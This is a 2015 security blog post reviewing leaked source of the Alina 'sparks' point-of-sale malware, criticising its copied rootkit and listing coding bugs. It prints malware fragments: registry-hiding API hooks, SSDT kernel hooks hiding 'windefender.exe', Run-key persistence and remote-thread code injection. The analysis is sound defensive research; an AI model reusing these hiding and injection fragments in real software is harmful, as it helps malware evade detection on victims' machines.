---
title: "Alina sparks source code review"
date: Wed, 14 Jan 2015 23:07:00 +0000
draft: false
type: posts
categories: 
- [object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object]
---
# Alina sparks source code review

<br/>

<br/>
I got on my hands recently the source code of Alina "sparks", the main 'improvement' that everyone is talking about and make the price of this malware rise is the rootkit feature.  
Josh Grunzweig did already an [interesting coverage](http://jgrunzweig.github.io/posts/2015/01/alina-starts-to-blur-the-lines/) of a sample, but what worth this new version ?  
  
InjectedDLL.c from the source is a Chinese copy-paste of [http://www.cnblogs.com/lzjsky/archive/2010/12/01/1892702.html](http://www.cnblogs.com/lzjsky/archive/2010/12/01/1892702.html) and commented out, replaced with two kernel32 hooks instead, like if the author cannot into hooks :D  
a comment is still in Chinese as you can see on the screenshot.  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcv4xbT-57XdNPjTduPIc84Tq86H00ICDQ9NAMtOEk2Fgdw-73QFGma8QTcw5rThSFpZcGWodN324r2JMPLLk_LaGTTKrYEjx99B_wEKChrqi22E0PCRpQxutWEh8W0tvyBQCdRKc3mus/s1600/2015-01-14_10-26-49.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcv4xbT-57XdNPjTduPIc84Tq86H00ICDQ9NAMtOEk2Fgdw-73QFGma8QTcw5rThSFpZcGWodN324r2JMPLLk_LaGTTKrYEjx99B_wEKChrqi22E0PCRpQxutWEh8W0tvyBQCdRKc3mus/s1600/2015-01-14_10-26-49.png)

  
\+ this:  

LONG WINAPI RegEnumValueAHook(HKEY hKey, DWORD dwIndex, LPTSTR lpValueName,LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)  
{  
LONG Result = RegEnumValueANext(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);  
if (StrCaseCompare(HIDDEN\_REGISTRY\_ENTRY, lpValueName) == 0)  
{  
Result = RegEnumValueWNext(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);  
}  
return Result;  
}  
  
...  
  
// Registry Value Hiding  
Win32HookAPI("advapi32.dll", "RegEnumValueA", (void \*) RegEnumValueAHook, (void \*) &RegEnumValueANext);  
Win32HookAPI("advapi32.dll", "RegEnumValueW", (void \*) RegEnumValueWHook, (void \*) &RegEnumValueWNext);

So many stupid mistakes in the code, no sanity checks in hooks, nothing stable.  
Haven't looked at a sample in the wild but i doubt it work anyhow.  
Actual rootkit source (body stored as hex array in RootkitDriver.inc c:\\drivers\\test\\objchk\_win7\_x86\\i386\\ssdthook.pdb) is not included in this pack of crap.  
  
This x86-32 driver is responsible for NtQuerySystemInformation, NtEnumerateValueKey, NtQueryDirectoryFile SSDT hooking.  
Driver is ridiculously simple:  

NTSTATUS NTAPI DrvMain(PDRIVER\_OBJECT DriverObject, PUNICODE\_STRING RegistryPath)  
{  
  DriverObject->DriverUnload = (PDRIVER\_UNLOAD)UnloadProc;  
  BuildMdlForSSDT();  
  InitStrings();  
  SetHooks();  
  return STATUS\_SUCCESS;  
}

  

BOOL SetHooks()  
{  
  if ( !NtQuerySystemInformationOrig )  
    NtQuerySystemInformationOrig = HookProc(ZwQuerySystemInformation, NtQuerySystemInformationHook);  
  if ( !NtEnumerateValueKeyOrig )  
    NtEnumerateValueKeyOrig = HookProc(ZwEnumerateValueKey, NtEnumerateValueKeyHook);  
  if ( !NtQueryDirectoryFileOrig )  
    NtQueryDirectoryFileOrig = HookProc(ZwQueryDirectoryFile, NtQueryDirectoryFileHook);  
  return TRUE;  
}

  
All of them hide 'windefender' target process, file, registry.  

void InitStrings()  
{  
  RtlInitUnicodeString((PUNICODE\_STRING)&WindefenderProcessString, L"windefender.exe");  
  RtlInitUnicodeString(&WindefenderFileString, L"windefender.exe");  
  RtlInitUnicodeString(&WindefenderRegistryString, L"windefender");  
}

It's the malware name, Josh pointed also in this direction on his analysis.  
First submitted on VT the 2013-10-17 17:27:10 UTC ( 1 year, 2 months ago )  
[https://www.virustotal.com/en/file/905170f460583ae9082f772e64d7856b8f609078af9823e9921331852fd07573/analysis/1421046545/](https://www.virustotal.com/en/file/905170f460583ae9082f772e64d7856b8f609078af9823e9921331852fd07573/analysis/1421046545/)  
  
Overall that dll seems unusued, alina project uses driver i mentioned.  
As for project itself, it's still an awful piece of students lab work, here is some log just from attempt to compile:  

source\\grab\\base.cpp(78)

If SHGetSpecialFolderPath returns FALSE, strcat to SourceFilePath will be used anyway.  
  
Two copy-pasted methods with same mistake:  

source\\grab\\base.cpp(298)  
source\\grab\\base.cpp(433)

Leaking process information handle pi.hProcess.  
  
Using hKey from failed function call:  

source\\grab\\base.cpp(316):  
if (RegOpenKeyEx(HKEY\_CURRENT\_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0L,  KEY\_ALL\_ACCESS, &hKey) != ERROR\_SUCCESS) {  
      RegCloseKey(hKey);

  
pThread could be NULL, this is checked only in WriteProcessMemory but not in CreateRemoteThread:  

source\\grab\\monitoringthread.cpp(110):  
LPVOID pThread = VirtualAllocEx(hProcess, NULL, ShellcodeLen, MEM\_COMMIT | MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE);  
if (pThread != NULL) WriteProcessMemory(hProcess, pThread, Shellcode, ShellcodeLen, &BytesWritten);  
HANDLE ThreadHandle =  CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD\_START\_ROUTINE) pThread, NULL, 0, &TID);

  
Where hwid declared as char hwid\[8\];  
Reading invalid data from hdr->hwid: the readable size is 8 bytes, but 18 bytes may be read:  

source\\grab\\panelrequest.cpp(73):  
memcpy(outkey, hdr->hwid, 18);

  
Realloc might return null pointer: assigning null pointer to buf, which is passed as an argument to realloc, will cause the original memory block to be leaked:  

source\\grab\\panelrequest.cpp(173)

  
The prior call to strncpy might not zero-terminate string Result:  

source\\grab\\scanner.cpp(159)

  
Return value of ReadFile ignored. If it will fail anywhere code will be corrupted as cmd variable is not initialized:  

source\\grab\\watcher.cpp(61)  
source\\grab\\watcher.cpp(64)  
source\\grab\\watcher.cpp(71)

  
Signed unsigned mismatch:  

source\\grab\\rootkitinstaller.cpp(47)

  
Unreferenced local variable hResult:  

source\\grab\\base.cpp(158)

  
Using TerminateThread does not allow proper thread clean up:  

source\\grab\\watcher.cpp(125)

  
Now related to 'editions' sparks have some, for examples the pipes, mutexes, user-agents, process black-list but most of these editions are minors things that anybody can do to 'customise' his own bot.  
In any case that can count as a code addition or something 'new'  
For the panel... well it's like the bot, nothing changed at all.  
It's still the same ugly design, still the same files with same modifications timestamp, no code addition, still the same cookie auth crap like if the coder can't use session in php and so on...  
  
To conclude, the main improvement is a copy/pasted rootkit who don't work, i don't know how many bad guys bought this source for 1k or more but that definitely not worth it.  
Overall it's a good example of how people can take a code, announce a rootkit to impress and play everything on malware notoriety.  
This remind me the guys who announced IceIX on malware forums and finally the samples was just a basic ZeuS with broken improvements.  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtJyqOBhEBiCbcUAzRhDAyNPk0XCVEY5HV7sP_NlprVy4crkFdE_HdE_2vUV3vcmKN5L31Zbv8hyaaECKqjLnGTD-lWfSghqV-aCSzo9r48HGXFah2zAAphW4C7lgHa3P1EkFW-HPj5CE/s1600/2015-01-14_10-39-01.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtJyqOBhEBiCbcUAzRhDAyNPk0XCVEY5HV7sP_NlprVy4crkFdE_HdE_2vUV3vcmKN5L31Zbv8hyaaECKqjLnGTD-lWfSghqV-aCSzo9r48HGXFah2zAAphW4C7lgHa3P1EkFW-HPj5CE/s1600/2015-01-14_10-39-01.png)

Hi Benson.

#### [Source](https://www.xylibox.com/2015/01/alina-sparks-source-code-review.html)

<br/>
---
